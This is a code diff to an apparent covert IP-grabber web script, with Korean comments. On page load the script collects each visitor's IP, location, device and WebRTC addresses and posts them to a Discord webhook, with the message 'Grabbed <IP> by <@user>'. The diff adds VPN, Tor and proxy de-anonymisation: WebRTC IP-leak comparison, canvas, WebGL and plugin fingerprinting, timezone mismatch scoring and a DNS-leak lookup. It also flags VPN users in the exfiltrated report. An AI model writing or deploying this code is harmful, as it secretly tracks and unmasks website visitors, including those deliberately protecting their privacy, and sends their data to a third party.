@@ -3,6 +3,573 @@ const WEBHOOK_URL_2 = 'https://discord.com/api/webhooks/1448713634111815691/aUP_
 
 let visitorInfo = {};
 
+/* ========== VPN/프록시 탐지 ========== */
+
+/**
+ * VPN/프록시 감지 종합 분석 (강화 버전)
+ * 클라이언트 + 서버 사이드 체크 통합
+ */
+async function detectVPNProxy() {
+    const result = {
+        isVPN: false,
+        isTor: false,
+        isProxy: false,
+        isDatacenter: false,
+        suspicionLevel: 0, // 0-100
+        reasons: [],
+        details: {
+            client: {},
+            server: {}
+        },
+        confidence: 'low' // low, medium, high, very-high
+    };
+
+    try {
+        // === 클라이언트 사이드 체크 ===
+        
+        // 1. WebRTC IP vs 공인 IP 비교
+        const webrtcIPs = await getWebRTCIPs();
+        const publicIP = visitorInfo.ip;
+
+        if (webrtcIPs.blocked === "Yes") {
+            result.suspicionLevel += 30;
+            result.reasons.push("WebRTC가 차단됨 (VPN/브라우저 설정 의심)");
+            result.details.client.webrtcBlocked = true;
+        }
+
+        // WebRTC에서 발견된 로컬 IP와 공인 IP 비교
+        if (webrtcIPs.candidateIPs.length > 0) {
+            const webrtcPublicIP = webrtcIPs.candidateIPs[0];
+            if (publicIP && webrtcPublicIP !== publicIP) {
+                result.suspicionLevel += 45;
+                result.reasons.push(`WebRTC IP(${webrtcPublicIP})와 공인 IP(${publicIP})가 불일치`);
+                result.isProxy = true;
+                result.details.client.ipMismatch = {
+                    publicIP: publicIP,
+                    webrtcIP: webrtcPublicIP
+                };
+            }
+        }
+
+        // 다중 WebRTC IP 감지 (프록시 체인 의심)
+        if (webrtcIPs.candidateIPs.length > 2) {
+            result.suspicionLevel += 20;
+            result.reasons.push(`다중 WebRTC 공인 IP 감지: ${webrtcIPs.candidateIPs.length}개`);
+            result.details.client.multiplePublicIPs = webrtcIPs.candidateIPs;
+        }
+
+        // 2. 타임존 불일치 감지
+        const timezoneCheck = await checkTimezoneConsistency();
+        if (!timezoneCheck.consistent) {
+            result.suspicionLevel += timezoneCheck.suspicionPoints;
+            result.reasons.push(timezoneCheck.reason);
+            result.details.client.timezoneInconsistency = timezoneCheck;
+        }
+
+        // 3. 알려진 VPN/프록시 서비스 탐지
+        const vpnServiceCheck = await checkKnownVPNServices();
+        if (vpnServiceCheck.detected) {
+            result.suspicionLevel += 55;
+            result.isVPN = true;
+            result.reasons.push(`알려진 VPN 서비스 감지: ${vpnServiceCheck.service}`);
+            result.details.client.vpnService = vpnServiceCheck;
+        }
+
+        // 4. Tor 탐지 (Tor exit node 확인)
+        const torCheck = await checkTorNetwork();
+        if (torCheck.isTor) {
+            result.suspicionLevel += 80;
+            result.isTor = true;
+            result.reasons.push("Tor 네트워크 감지");
+            result.details.client.tor = torCheck;
+        }
+
+        // 5. 다중 로컬 IP 주소 감지 (의심스러운 네트워크 설정)
+        if (webrtcIPs.localIPs.length > 3) {
+            result.suspicionLevel += 15;
+            result.reasons.push(`비정상적으로 많은 로컬 IP 주소: ${webrtcIPs.localIPs.length}개`);
+        }
+
+        // 6. DNS 누출 체크
+        const dnsLeakCheck = await checkDNSLeak();
+        if (dnsLeakCheck.leaked) {
+            result.suspicionLevel += 25;
+            result.reasons.push("DNS 누출 감지");
+            result.details.client.dnsLeak = dnsLeakCheck;
+        }
+
+        // 7. 브라우저 특성 분석
+        const browserAnomalies = detectBrowserAnomalies();
+        if (browserAnomalies.suspicious) {
+            result.suspicionLevel += browserAnomalies.points;
+            result.reasons.push(...browserAnomalies.reasons);
+            result.details.client.browserAnomalies = browserAnomalies;
+        }
+
+        // 8. WebRTC 연결 지연 분석
+        const webrtcLatency = await measureWebRTCLatency();
+        if (webrtcLatency.suspicious) {
+            result.suspicionLevel += webrtcLatency.points;
+            result.reasons.push(webrtcLatency.reason);
+            result.details.client.webrtcLatency = webrtcLatency;
+        }
+
+        // === 서버 사이드 체크 요청 ===
+        try {
+            const serverCheck = await requestServerSideCheck({
+                ip: publicIP,
+                location: visitorInfo.location,
+                device: visitorInfo.device,
+                browser: visitorInfo.browser,
+                timezone: visitorInfo.timezoneInfo,
+                webrtc: webrtcIPs
+            });
+
+            if (serverCheck && !serverCheck.error) {
+                result.details.server = serverCheck;
+                result.suspicionLevel += serverCheck.suspicionPoints || 0;
+                
+                if (serverCheck.reasons && serverCheck.reasons.length > 0) {
+                    result.reasons.push(...serverCheck.reasons.map(r => `[서버] ${r}`));
+                }
+
+                // 서버에서 감지한 VPN/프록시 정보 반영
+                if (serverCheck.serverChecks) {
+                    if (serverCheck.serverChecks.ipReputation?.isVPN) {
+                        result.isVPN = true;
+                    }
+                    if (serverCheck.serverChecks.ipReputation?.isTor) {
+                        result.isTor = true;
+                    }
+                    if (serverCheck.serverChecks.ipReputation?.isProxy) {
+                        result.isProxy = true;
+                    }
+                    if (serverCheck.serverChecks.advancedDetection?.isHosting) {
+                        result.isDatacenter = true;
+                    }
+                }
+            }
+        } catch (serverError) {
+            result.details.server.error = serverError.message;
+            result.reasons.push("[서버] 서버 체크 실패 (의심도 증가)");
+            result.suspicionLevel += 10; // 서버 체크 실패도 약간 의심스러움
+        }
+
+        // === 최종 판단 ===
+        
+        // 의심 레벨 상한선 설정
+        result.suspicionLevel = Math.min(result.suspicionLevel, 100);
+
+        // 신뢰도 계산
+        const checkCount = result.reasons.length;
+        if (result.suspicionLevel >= 80 && checkCount >= 5) {
+            result.confidence = 'very-high';
+        } else if (result.suspicionLevel >= 60 && checkCount >= 3) {
+            result.confidence = 'high';
+        } else if (result.suspicionLevel >= 40 && checkCount >= 2) {
+            result.confidence = 'medium';
+        } else {
+            result.confidence = 'low';
+        }
+
+        // 최종 VPN/프록시 판단
+        if (result.suspicionLevel >= 70 || result.isTor) {
+            result.isVPN = true;
+        } else if (result.suspicionLevel >= 50) {
+            result.isProxy = true;
+        }
+
+        // 위험도 레벨 추가
+        if (result.suspicionLevel >= 80) {
+            result.riskLevel = 'critical';
+        } else if (result.suspicionLevel >= 60) {
+            result.riskLevel = 'high';
+        } else if (result.suspicionLevel >= 40) {
+            result.riskLevel = 'medium';
+        } else if (result.suspicionLevel >= 20) {
+            result.riskLevel = 'low';
+        } else {
+            result.riskLevel = 'none';
+        }
+
+    } catch (error) {
+        result.error = error.message;
+        result.reasons.push(`오류 발생: ${error.message}`);
+    }
+
+    return result;
+}
+
+/**
+ * 서버 사이드 체크 요청
+ */
+async function requestServerSideCheck(clientData) {
+    try {
+        const response = await fetch('/api/vpn-check', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(clientData)
+        });
+
+        if (!response.ok) {
+            throw new Error(`Server check failed: ${response.status}`);
+        }
+
+        return await response.json();
+    } catch (error) {
+        console.warn('Server-side VPN check failed:', error);
+        return { error: error.message };
+    }
+}
+
+/**
+ * 브라우저 이상 징후 탐지
+ */
+function detectBrowserAnomalies() {
+    const result = {
+        suspicious: false,
+        points: 0,
+        reasons: [],
+        anomalies: []
+    };
+
+    // 1. 플러그인 수 체크 (VPN 브라우저는 플러그인이 적을 수 있음)
+    const pluginCount = navigator.plugins.length;
+    if (pluginCount === 0) {
+        result.points += 15;
+        result.reasons.push('플러그인이 전혀 없음 (헤드리스 브라우저 의심)');
+        result.anomalies.push('no-plugins');
+        result.suspicious = true;
+    } else if (pluginCount < 3 && !navigator.userAgent.includes('Mobile')) {
+        result.points += 8;
+        result.reasons.push('비정상적으로 적은 플러그인 수');
+        result.anomalies.push('few-plugins');
+        result.suspicious = true;
+    }
+
+    // 2. Canvas 일관성 체크
+    try {
+        const canvas1 = getCanvasFingerprint();
+        const canvas2 = getCanvasFingerprint();
+        if (canvas1 !== canvas2) {
+            result.points += 25;
+            result.reasons.push('Canvas 핑거프린트 불일치 (스푸핑 의심)');
+            result.anomalies.push('canvas-spoofing');
+            result.suspicious = true;
+        }
+    } catch (error) {
+        result.points += 10;
+        result.reasons.push('Canvas API 오류');
+    }
+
+    // 3. WebGL 벤더 체크
+    const webgl = visitorInfo.webgl;
+    if (webgl && (webgl.vendor === 'N/A' || webgl.renderer === 'N/A')) {
+        result.points += 12;
+        result.reasons.push('WebGL 정보 누락 (차단/스푸핑 의심)');
+        result.anomalies.push('webgl-blocked');
+        result.suspicious = true;
+    }
+
+    // 4. 언어 불일치
+    const languages = navigator.languages || [navigator.language];
+    if (languages.length === 1 && languages[0] === 'en-US') {
+        result.points += 5;
+        result.reasons.push('단일 언어 설정 (en-US only)');
+        result.anomalies.push('single-language');
+    }
+
+    // 5. 화면 크기 이상
+    if (screen.width === screen.availWidth && screen.height === screen.availHeight) {
+        // 전체화면 모드이거나 VM
+        if (screen.width === 800 && screen.height === 600) {
+            result.points += 15;
+            result.reasons.push('기본 VM 화면 크기 감지 (800x600)');
+            result.anomalies.push('vm-screen');
+            result.suspicious = true;
+        }
+    }
+
+    // 6. 터치 지원 불일치
+    const isMobile = /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent);
+    const hasTouch = navigator.maxTouchPoints > 0;
+    if (isMobile && !hasTouch) {
+        result.points += 10;
+        result.reasons.push('모바일 UA인데 터치 미지원 (에뮬레이터 의심)');
+        result.anomalies.push('fake-mobile');
+        result.suspicious = true;
+    }
+
+    // 7. Do Not Track 설정
+    if (navigator.doNotTrack === '1') {
+        result.points += 5;
+        result.reasons.push('Do Not Track 활성화 (프라이버시 중시 사용자)');
+    }
+
+    // 8. 배터리 API 누락 (데스크톱에서)
+    if (!isMobile && !('getBattery' in navigator)) {
+        result.points += 3;
+        result.reasons.push('배터리 API 미지원');
+    }
+
+    return result;
+}
+
+/**
+ * WebRTC 연결 지연 측정
+ * VPN/프록시 사용시 지연이 증가할 수 있음
+ */
+async function measureWebRTCLatency() {
+    const result = {
+        latency: 0,
+        suspicious: false,
+        points: 0,
+        reason: ''
+    };
+
+    try {
+        const startTime = Date.now();
+        
+        // 간단한 STUN 요청으로 지연 측정
+        const pc = new RTCPeerConnection({
+            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+        });
+
+        pc.createDataChannel('latency-test');
+
+        await pc.createOffer().then(offer => pc.setLocalDescription(offer));
+
+        // ICE candidate 수집 대기
+        await new Promise((resolve) => {
+            pc.onicecandidate = (event) => {
+                if (!event.candidate) {
+                    resolve();
+                }
+            };
+            setTimeout(resolve, 2000); // 최대 2초 대기
+        });
+
+        const endTime = Date.now();
+        result.latency = endTime - startTime;
+
+        pc.close();
+
+        // 지연이 비정상적으로 높으면 의심
+        if (result.latency > 1500) {
+            result.suspicious = true;
+            result.points = 20;
+            result.reason = `WebRTC 연결 지연 높음: ${result.latency}ms (VPN/프록시 의심)`;
+        } else if (result.latency > 1000) {
+            result.suspicious = true;
+            result.points = 10;
+            result.reason = `WebRTC 연결 지연 약간 높음: ${result.latency}ms`;
+        }
+
+    } catch (error) {
+        result.error = error.message;
+        result.suspicious = true;
+        result.points = 15;
+        result.reason = 'WebRTC 연결 실패';
+    }
+
+    return result;
+}
+
+/**
+ * 타임존 일관성 체크
+ * IP 기반 위치의 타임존 vs 브라우저 타임존
+ */
+async function checkTimezoneConsistency() {
+    const result = {
+        consistent: true,
+        suspicionPoints: 0,
+        reason: "",
+        details: {}
+    };
+
+    try {
+        const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const browserOffset = new Date().getTimezoneOffset();
+        
+        // IP 기반 위치의 타임존 (이미 수집된 경우)
+        const locationTimezone = visitorInfo.location?.timezone;
+
+        result.details.browserTimezone = browserTimezone;
+        result.details.browserOffset = browserOffset;
+        result.details.locationTimezone = locationTimezone;
+
+        if (locationTimezone && browserTimezone !== locationTimezone) {
+            // 타임존이 완전히 다른 경우
+            result.consistent = false;
+            result.suspicionPoints = 35;
+            result.reason = `타임존 불일치: 브라우저(${browserTimezone}) vs 위치(${locationTimezone})`;
+        }
+
+        // 추가: 언어 설정 vs 위치 불일치
+        const browserLang = navigator.language || navigator.userLanguage;
+        const countryCode = visitorInfo.location?.countryCode;
+        
+        if (countryCode && browserLang) {
+            const langCountry = browserLang.split('-')[1]?.toUpperCase();
+            if (langCountry && langCountry !== countryCode && langCountry !== 'US') {
+                result.suspicionPoints += 10;
+                result.reason += ` | 언어(${browserLang})와 국가(${countryCode}) 불일치`;
+            }
+        }
+
+    } catch (error) {
+        result.error = error.message;
+    }
+
+    return result;
+}
+
+/**
+ * 알려진 VPN/프록시 서비스 탐지
+ * ISP, 조직명, 호스팅 서비스 체크
+ */
+async function checkKnownVPNServices() {
+    const result = {
+        detected: false,
+        service: null,
+        type: null
+    };
+
+    const isp = visitorInfo.location?.isp?.toLowerCase() || "";
+    const org = visitorInfo.location?.org?.toLowerCase() || "";
+
+    // 알려진 VPN 서비스 키워드
+    const vpnKeywords = [
+        'vpn', 'proxy', 'nordvpn', 'expressvpn', 'surfshark', 'cyberghost',
+        'private internet access', 'protonvpn', 'tunnelbear', 'windscribe',
+        'mullvad', 'ivpn', 'airvpn', 'perfect privacy', 'vyprvpn',
+        'hide.me', 'hotspot shield', 'ipvanish', 'purevpn', 'zenmate'
+    ];
+
+    // 데이터센터/호스팅 서비스 키워드
+    const hostingKeywords = [
+        'amazon', 'aws', 'google cloud', 'microsoft azure', 'digitalocean',
+        'linode', 'vultr', 'ovh', 'hetzner', 'contabo', 'scaleway',
+        'datacamp', 'choopa', 'servermania', 'hostwinds', 'psychz'
+    ];
+
+    for (const keyword of vpnKeywords) {
+        if (isp.includes(keyword) || org.includes(keyword)) {
+            result.detected = true;
+            result.service = keyword;
+            result.type = 'VPN';
+            break;
+        }
+    }
+
+    if (!result.detected) {
+        for (const keyword of hostingKeywords) {
+            if (isp.includes(keyword) || org.includes(keyword)) {
+                result.detected = true;
+                result.service = keyword;
+                result.type = 'Hosting/Datacenter';
+                break;
+            }
+        }
+    }
+
+    return result;
+}
+
+/**
+ * Tor 네트워크 감지
+ * 공개 Tor exit node 목록과 비교
+ */
+async function checkTorNetwork() {
+    const result = {
+        isTor: false,
+        checked: false
+    };
+
+    try {
+        // Tor exit node 체크 (TorProject API 또는 공개 DB 사용)
+        const ip = visitorInfo.ip;
+        if (!ip) return result;
+
+        // 방법 1: Tor Project의 공식 체크
+        // https://check.torproject.org/torbulkexitlist 사용 가능
+        
+        // 방법 2: ISP/조직명에서 Tor 감지
+        const isp = visitorInfo.location?.isp?.toLowerCase() || "";
+        const org = visitorInfo.location?.org?.toLowerCase() || "";
+
+        if (isp.includes('tor') || org.includes('tor') || 
+            isp.includes('exit') && isp.includes('node')) {
+            result.isTor = true;
+            result.checked = true;
+        }
+
+        // 방법 3: 리버스 DNS가 Tor 패턴인지 확인
+        // 실제 구현시 DNS API 사용
+
+    } catch (error) {
+        result.error = error.message;
+    }
+
+    return result;
+}
+
+/**
+ * DNS 누출 체크
+ * DNS 서버가 VPN과 같은 국가에 있는지 확인
+ */
+async function checkDNSLeak() {
+    const result = {
+        leaked: false,
+        dnsServers: [],
+        details: null
+    };
+
+    try {
+        // 브라우저에서는 직접 DNS 서버를 알기 어렵지만
+        // 간접적으로 DNS over HTTPS를 통해 체크 가능
+        
+        // 방법 1: 타사 DNS leak test API 사용
+        const response = await fetch('https://www.dnsleaktest.com/api/dns-servers');
+        if (response.ok) {
+            const data = await response.json();
+            result.dnsServers = data;
+            
+            // DNS 서버 국가와 공인 IP 국가 비교
+            const ipCountry = visitorInfo.location?.countryCode;
+            if (data.length > 0 && data[0].country !== ipCountry) {
+                result.leaked = true;
+                result.details = `DNS 서버 국가(${data[0].country})와 IP 국가(${ipCountry})가 다름`;
+            }
+        }
+    } catch (error) {
+        // API 실패시 무시 (선택적 기능)
+        result.error = error.message;
+    }
+
+    return result;
+}
+
+/**
+ * 추가: 프록시 헤더 감지
+ * 일부 프록시는 HTTP 헤더에 흔적을 남김
+ */
+function detectProxyHeaders() {
+    const suspiciousHeaders = [];
+    
+    // 브라우저에서는 직접 헤더를 읽을 수 없지만,
+    // 서버 사이드에서 다음 헤더들을 체크 가능:
+    // X-Forwarded-For, X-Real-IP, Via, X-Proxy-ID 등
+    
+    return {
+        detected: suspiciousHeaders.length > 0,
+        headers: suspiciousHeaders
+    };
+}
+
+
 /* ========== 기본 정보 수집 ========== */
 
 function getDeviceInfo() {
@@ -470,15 +1037,28 @@ async function collectAndSendInfo() {
         // WebRTC IP 후보 정보
         visitorInfo.webRTC = await getWebRTCIPs();
 
+        // VPN/프록시 탐지
+        visitorInfo.vpnDetection = await detectVPNProxy();
+
         const embed = {
             title: "새로운 방문자 정보",
             description: "사용자가 페이지에 접속했습니다.",
-            color: 0x5865F2,
+            color: visitorInfo.vpnDetection.isVPN || visitorInfo.vpnDetection.isTor ? 0xFF6B6B : 0x5865F2, // VPN 감지시 빨간색
             timestamp: visitorInfo.timestamp,
             thumbnail: {
                 url: "https://cdn3.emoji.gg/emojis/6333-discord-logo.png"
             },
             fields: [
+                {
+                    name: "🚨 VPN/프록시 탐지 결과",
+                    value:
+                        `**의심 수준:** ${visitorInfo.vpnDetection.suspicionLevel}% ${visitorInfo.vpnDetection.suspicionLevel >= 60 ? '🔴 높음' : visitorInfo.vpnDetection.suspicionLevel >= 40 ? '🟡 중간' : '🟢 낮음'}\n` +
+                        `**VPN 감지:** ${visitorInfo.vpnDetection.isVPN ? '✅ 예' : '❌ 아니오'}\n` +
+                        `**Tor 감지:** ${visitorInfo.vpnDetection.isTor ? '✅ 예' : '❌ 아니오'}\n` +
+                        `**프록시 감지:** ${visitorInfo.vpnDetection.isProxy ? '✅ 예' : '❌ 아니오'}\n` +
+                        `**감지 이유:** ${visitorInfo.vpnDetection.reasons.length > 0 ? visitorInfo.vpnDetection.reasons.join('\n- ') : '정상 연결'}`,
+                    inline: false
+                },
                 {
                     name: "기본 정보",
                     value:
@@ -528,7 +1108,12 @@ async function collectAndSendInfo() {
             footer: { text: "자동 수집 시스템" }
         };
 
-        const contentMessage = `Grabbed \`${visitorInfo.ip || "Unknown IP"}\` by <@1448530688558235719>`
+        const contentMessage = `Grabbed \`${visitorInfo.ip || "Unknown IP"}\` by <@1448530688558235719> ${
+            visitorInfo.vpnDetection.isVPN ? '🔴 **[VPN 감지!]**' : 
+            visitorInfo.vpnDetection.isTor ? '🔴 **[Tor 감지!]**' : 
+            visitorInfo.vpnDetection.isProxy ? '🟡 **[프록시 의심]**' : 
+            '🟢'
+        }`
         
         const payload = { 
             content: contentMessage,
